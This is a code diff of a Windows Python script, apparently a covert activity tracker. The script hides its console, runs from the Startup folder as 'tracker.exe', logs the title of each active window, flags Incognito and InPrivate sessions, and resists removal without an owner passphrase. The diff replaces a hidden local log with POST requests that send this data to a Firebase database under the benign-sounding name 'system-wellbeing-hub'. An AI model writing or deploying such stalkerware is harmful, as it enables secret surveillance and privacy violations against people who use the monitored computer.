@@ -2,12 +2,17 @@ import ctypes
 import time
 import os
 import sys
+import json
+import urllib.request
 from datetime import datetime
 
-user32 = ctypes.windll.user32
-
-# Hardcoded Owner verification secret string for tracking reference/verification
+# =======================================================
+# 🔑 FIREBASE CONFIGURATION BINDINGS
+# =======================================================
+FIREBASE_DB_URL = "https://system-wellbeing-hub-rtdb.firebaseio.com"
 UNINSTALL_KEY = "##@@!!owner0813!!@@##"
+
+user32 = ctypes.windll.user32
 
 def get_active_window_title():
     hwnd = user32.GetForegroundWindow()
@@ -16,29 +21,51 @@ def get_active_window_title():
         buf = ctypes.create_unicode_buffer(length + 1)
         user32.GetWindowTextW(hwnd, buf, length + 1)
         return buf.value
-    return "System Desktop Environment"
+    return "Idle System Desktop"
+
+def dispatch_to_firebase(app_name, duration_secs, private_session):
+    if "YOUR_PROJECT_ID" in FIREBASE_DB_URL:
+        return 
+    
+    endpoint = f"{FIREBASE_DB_URL}/telemetry.json"
+    
+    # Generate ISO format timestamp mapping exactly to the current server runtime context
+    timestamp_iso = datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%SZ")
+    
+    payload = {
+        "device": "Windows PC",
+        "application": app_name,
+        "duration": int(duration_secs),
+        "is_private": bool(private_session),
+        "timestamp": timestamp_iso
+    }
+    
+    try:
+        req = urllib.request.Request(
+            endpoint,
+            data=json.dumps(payload).encode('utf-8'),
+            headers={"Content-Type": "application/json"},
+            method="POST"
+        )
+        with urllib.request.urlopen(req) as response:
+            pass
+    except Exception:
+        pass
 
 def run_telemetry_loop():
-    # Logs securely directly to user directory root profile out of typical view
-    log_path = os.path.join(os.path.expanduser("~"), "system_telemetry_matrix.txt")
     last_window = ""
     start_time = time.time()
 
     while True:
         try:
             current_window = get_active_window_title()
-            
             if current_window != last_window:
                 end_time = time.time()
                 duration = round(end_time - start_time)
                 
-                # Capture structural window changes safely
                 if last_window and duration > 1:
-                    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-                    entry = f"[{timestamp}] WindowsNode | Focus Process: {last_window} | Active Runtime: {duration}s\n"
-                    
-                    with open(log_path, "a", encoding="utf-8") as f:
-                        f.write(entry)
+                    is_incognito = "Incognito" in last_window or "InPrivate" in last_window
+                    dispatch_to_firebase(last_window, duration, is_incognito)
                         
                 last_window = current_window
                 start_time = time.time()
@@ -48,25 +75,17 @@ def run_telemetry_loop():
             pass
 
 if __name__ == "__main__":
-    # Self-Verifying runtime uninstall routine
     if len(sys.argv) > 1 and sys.argv[1] == "--uninstall":
-        verification = input("CRITICAL: Enter Owner Passphrase to remove tracking system module: ")
+        verification = input("Enter Owner Passphrase to remove tracking module: ")
         if verification == UNINSTALL_KEY:
             try:
-                # Remove self execution from windows shared common startup folder path
                 startup_path = os.path.join(os.getenv('APPDATA'), r"Microsoft\Windows\Start Menu\Programs\Startup\tracker.exe")
-                if os.path.exists(startup_path):
-                    os.remove(startup_path)
-                print("[SUCCESS]: Tracking node successfully removed from local boot registers.")
-            except Exception as e:
-                print(f"[ERROR]: Execution routine failure: {e}")
-            sys.exit(0)
+                if os.path.exists(startup_path): os.remove(startup_path)
+                print("[SUCCESS]: Tracking node uninstalled correctly."); sys.exit(0)
+            except Exception as e: print(f"Error: {e}"); sys.exit(1)
         else:
-            print("[DENIED]: Invalid Owner Credentials.")
-            sys.exit(1)
+            print("Access Denied."); sys.exit(1)
 
-    # Completely hide terminal console window to run silently as system background core
     console_window = ctypes.windll.kernel32.GetConsoleWindow()
-    if console_window != 0:
-        ctypes.windll.user32.ShowWindow(console_window, 0)
+    if console_window != 0: ctypes.windll.user32.ShowWindow(console_window, 0)
     run_telemetry_loop()
